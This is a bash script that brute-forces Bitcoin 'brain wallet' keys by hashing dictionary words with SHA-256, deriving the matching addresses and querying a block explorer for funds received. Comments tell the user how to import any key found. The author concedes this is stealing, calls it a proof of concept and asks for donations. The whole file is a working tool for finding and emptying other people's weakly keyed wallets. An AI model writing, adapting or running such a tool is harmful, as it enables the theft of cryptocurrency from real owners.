#!/bin/bash

# 0xAF: brute force bitcoin addresses based on dictionary word keys
# if someone were stupid enough to make his private key out of a word... then bye-bye coins
# take a look at these words: 'sausage', 'fuckyou'
# unfortunately this is stealing, so i must say it:
# this script is just a proof of concept, do not steal other people money !
# if you find this script useful, you can always donate something to this address:
# 12XZbCEwwzFbrZ813rZuTESrEjaepxRd3B
#
# if you find a match do this:
# . bitcoin.sh
# newBitcoinKey "0x$(echo -n 'lucky_word' | sha256sum | cut -c -64)"

# get bitcoin.sh from here:
# https://raw.github.com/grondilu/bitcoin-bash-tools/master/bitcoin.sh

source ./bitcoin.sh

bitcoin_check() {
	k=$(echo -n $1 | sha256sum | cut -c -64)
	z=$(newBitcoinKey "0x$k" | tail -1 | cut -d ':' -f 2| tr -d ' ')
	x=$(curl http://blockexplorer.com/q/getreceivedbyaddress/$z 2>/dev/null)
	echo "${x/\*/\\\*}" "[$1] http://blockexplorer.com/address/$z" | tee -a bitcoin.log
	if [[ "$x" != "0" && "$x" != "ERROR: invalid address" ]]; then
		return 1;
	fi
	return 0;
}

declare -f on_exit
function on_exit()
{
	echo
	echo "last word: $p at line $count"
	exit 0;
}

trap on_exit SIGINT
trap on_exit SIGQUIT
trap on_exit SIGTERM

if [[ -z $1 ]]; then
	echo usage: $0 [dictionary_file] [word_to_continue_from]
	exit 1
fi

WORD=$2

if [[ -n $WORD ]]; then
	cont=1
else
	cont=0
fi

wc=$(wc -l $1 | cut -f 1 -d " ")
count=0;
while read p; do
	count=$(( count + 1 ))
	if [[ $cont == 1 ]]; then
		if [[ "$p" == "$WORD" ]]; then
			echo "Found word [$WORD] at line $count, starting from here"
			cont=0
		else
			continue
		fi
	fi

	echo -ne "\r[$count/$wc]"

	x=$(bitcoin_check "$p")
	if [[ $? -gt 0 ]]; then
		echo
		echo $x
	fi
done < $1

echo
echo DONE
echo

if [[ $cont == 1 ]]; then
	echo "Never found word [$WORD]. Nothing happened..."
fi

